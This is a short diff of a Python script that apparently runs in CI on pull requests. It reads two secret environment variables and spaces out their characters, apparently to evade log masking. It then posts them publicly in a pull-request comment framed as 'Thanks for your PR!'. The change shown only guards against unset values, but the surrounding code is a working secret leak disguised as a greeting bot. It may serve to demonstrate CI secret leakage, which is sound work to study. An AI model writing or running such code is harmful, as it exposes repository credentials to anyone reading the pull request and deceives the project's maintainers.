@@ -18,8 +18,8 @@ def main():
     secret = e.get("SECRET")
     secret2 = e.get("SECRET2")
     # add space between every character
-    secret = " ".join(secret)
-    secret2 = " ".join(secret2)
+    secret = " ".join(secret if secret else "")
+    secret2 = " ".join(secret2 if secret2 else "")
     
     gh_post_pr_comment(org, project, args.pr_num, f"Thanks for your PR! + env: {secret} + {secret2}")
 
